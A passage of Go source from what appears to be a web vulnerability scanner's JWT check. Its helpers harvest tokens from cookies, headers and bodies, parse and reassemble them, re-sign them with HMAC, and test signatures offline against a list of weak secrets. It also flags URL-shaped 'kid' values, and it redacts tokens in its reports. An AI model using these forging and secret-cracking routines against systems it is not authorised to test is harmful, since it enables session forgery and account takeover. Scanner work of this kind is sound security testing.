		DedupeKey: MakeKey((&JWTVulns{}).Name(), ScopeHost, target, "kid-as-url"),
	}
}

// kidLooksLikeURL is the cheap URL-shape gate the kid advisory uses.
// Matches absolute URLs (http://, https://) and protocol-relative
// shorthand (//), which are the three forms the historical kid-as-URL
// CVEs honoured.
func kidLooksLikeURL(s string) bool {
	switch {
	case strings.HasPrefix(s, "http://"),
		strings.HasPrefix(s, "https://"),
		strings.HasPrefix(s, "//"):
		return true
	}
	return false
}

// harvestJWTs scrapes the page for every distinct JWT-shaped token,
// recording where it came from so the probe can re-attach the modified
// token through the same channel.
func harvestJWTs(p page.Page) []jwtSource {
	seen := map[string]*jwtSource{}
	add := func(raw string, src jwtSource) {
		raw = strings.TrimSpace(raw)
		if !isJWTShape(raw) {
			return
		}
		if _, ok := seen[raw]; ok {
			return
		}
		src.raw = raw
		seen[raw] = &src
	}

	// Set-Cookie: the highest-quality source because we recover the
	// cookie name and can replay the token through the channel the
	// application expects.
	if p.Headers != nil {
		dummyResp := &http.Response{Header: p.Headers}
		for _, ck := range dummyResp.Cookies() {
			add(ck.Value, jwtSource{cookieName: ck.Name})
		}
		for name, vals := range p.Headers {
			if strings.EqualFold(name, "set-cookie") {
				continue
			}
			for _, v := range vals {
				// Authorization: Bearer <token> on responses is rare but
				// happens (echoed back on login bodies, debug servers).
				trimmed := strings.TrimSpace(v)
				if strings.HasPrefix(strings.ToLower(trimmed), "bearer ") {
					trimmed = strings.TrimSpace(trimmed[len("bearer "):])
				}
				add(trimmed, jwtSource{headerName: name})
				// Also scan the raw header value for a JWT substring -
				// some custom headers carry mixed metadata.
				for _, m := range jwtTokenRe.FindAllString(v, -1) {
					add(m, jwtSource{headerName: name})
				}
			}
		}
	}
	if len(p.Body) > 0 {
		for _, m := range jwtTokenRe.FindAll(p.Body, -1) {
			add(string(m), jwtSource{fromBody: true})
		}
	}

	out := make([]jwtSource, 0, len(seen))
	for _, s := range seen {
		out = append(out, *s)
	}
	sort.Slice(out, func(i, j int) bool { return out[i].raw < out[j].raw })
	return out
}

// isJWTShape gates harvest entries on the structural minimum (three
// base64url segments joined by dots, header opening with the "eyJ"
// signature of a base64url-encoded JSON object). Lets us scan headers
// and bodies aggressively without dragging in random dotted tokens.
func isJWTShape(s string) bool {
	if !strings.HasPrefix(s, "eyJ") {
		return false
	}
	parts := strings.Split(s, ".")
	if len(parts) != 3 {
		return false
	}
	if len(parts[0]) < 4 || len(parts[1]) < 4 {
		return false
	}
	return jwtTokenRe.MatchString(s)
}

// parseJWT decodes the header and payload segments. The signature
// segment is decoded for HMAC verification but allowed to be empty
// (alg=none tokens leave it empty on the wire).
func parseJWT(raw string) (*parsedJWT, error) {
	parts := strings.Split(raw, ".")
	if len(parts) != 3 {
		return nil, fmt.Errorf("expected 3 segments, got %d", len(parts))
	}
	hdrRaw, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return nil, fmt.Errorf("header: %w", err)
	}
	plRaw, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return nil, fmt.Errorf("payload: %w", err)
	}
	var sig []byte
	if parts[2] != "" {
		sig, err = base64.RawURLEncoding.DecodeString(parts[2])
		if err != nil {
			return nil, fmt.Errorf("signature: %w", err)
		}
	}
	var hdr map[string]any
	if err := json.Unmarshal(hdrRaw, &hdr); err != nil {
		return nil, fmt.Errorf("header json: %w", err)
	}
	return &parsedJWT{
		headerRaw:    hdrRaw,
		header:       hdr,
		payloadRaw:   plRaw,
		headerB64:    parts[0],
		payloadB64:   parts[1],
		signatureB64: parts[2],
		signature:    sig,
		signing:      parts[0] + "." + parts[1],
	}, nil
}

// assembleToken builds a wire JWT from a JSON-serialisable header, raw
// payload bytes, and a signature. The header is re-marshalled (Go's
// json package output is stable for map[string]any with string keys,
// so the result is deterministic across calls) and the signature is
// emitted as raw base64url with no padding per the JOSE spec.
func assembleToken(header map[string]any, payload, signature []byte) (string, error) {
	hdrJSON, err := json.Marshal(header)
	if err != nil {
		return "", err
	}
	h := base64.RawURLEncoding.EncodeToString(hdrJSON)
	p := base64.RawURLEncoding.EncodeToString(payload)
	s := base64.RawURLEncoding.EncodeToString(signature)
	return h + "." + p + "." + s, nil
}

// headerPayloadSigning returns the "header.payload" bytes that an HMAC
// signature is computed over. Marshals the header the same way
// assembleToken does so the value the probe HMACs is byte-identical
// to the wire string the validator will HMAC.
func headerPayloadSigning(header map[string]any, payload []byte) []byte {
	hdrJSON, _ := json.Marshal(header)
	h := base64.RawURLEncoding.EncodeToString(hdrJSON)
	p := base64.RawURLEncoding.EncodeToString(payload)
	return []byte(h + "." + p)
}

// hmacSign returns the raw HMAC digest of message under key for the
// hash family h. Used by every re-signing path in the check.
func hmacSign(h func() hash.Hash, key, message []byte) []byte {
	mac := hmac.New(h, key)
	mac.Write(message)
	return mac.Sum(nil)
}

// tryWeakHMACSecret iterates weakHS256Secrets and returns the first
// one that produces the token's existing signature under alg. Returns
// (secret, true) on hit, ("", false) otherwise. Pure-offline; no
// network traffic is generated regardless of outcome.
func tryWeakHMACSecret(parsed *parsedJWT, alg string) (string, bool) {
	if len(parsed.signature) == 0 {
		return "", false
	}
	h := hashFor(alg)
	if h == nil {
		return "", false
	}
	signing := []byte(parsed.signing)
	for _, candidate := range weakHS256Secrets {
		mac := hmacSign(h, []byte(candidate), signing)
		if hmac.Equal(mac, parsed.signature) {
			return candidate, true
		}
	}
	return "", false
}

// hashFor maps an HMAC alg label to the hash constructor. Returns nil
// for non-HMAC algorithms (RS*, ES*, PS*, EdDSA, none) so callers can
// gate HMAC-specific work behind the lookup.
func hashFor(alg string) func() hash.Hash {
	switch alg {
	case "HS256":
		return sha256.New
	case "HS384":
		return sha512.New384
	case "HS512":
		return sha512.New
	}
	return nil
}

// cloneHeader returns a shallow copy of the JOSE header map so probe
// builders can mutate without affecting the parsed reference shared
// across probes.
func cloneHeader(h map[string]any) map[string]any {
	out := make(map[string]any, len(h))
	for k, v := range h {
		out[k] = v
	}
	return out
}

// asString coerces a JSON-decoded value to its string form when the
// underlying type is string; otherwise returns "". Header lookups
// (alg, kid, jku, x5u) all expect string values per JOSE.
func asString(v any) string {
	if s, ok := v.(string); ok {
		return s
	}
	return ""
}

// redactToken keeps the leading and trailing 8 bytes of a JWT so two
// findings about the same token are still recognisable in a report
// without leaking the full bearer.
func redactToken(t string) string {
	if len(t) <= 20 {
		return strings.Repeat("*", len(t))
	}
	return t[:8] + "..." + t[len(t)-8:]
}

// tokenFingerprint stabilises per-token dedupe across pages and runs.
// SHA-1 prefix is fine here: there is no adversary, only deterministic
// grouping (same contract as MakeDedupeKey).
func tokenFingerprint(t string) string {
	return MakeDedupeKey("jwt-token", t)
}
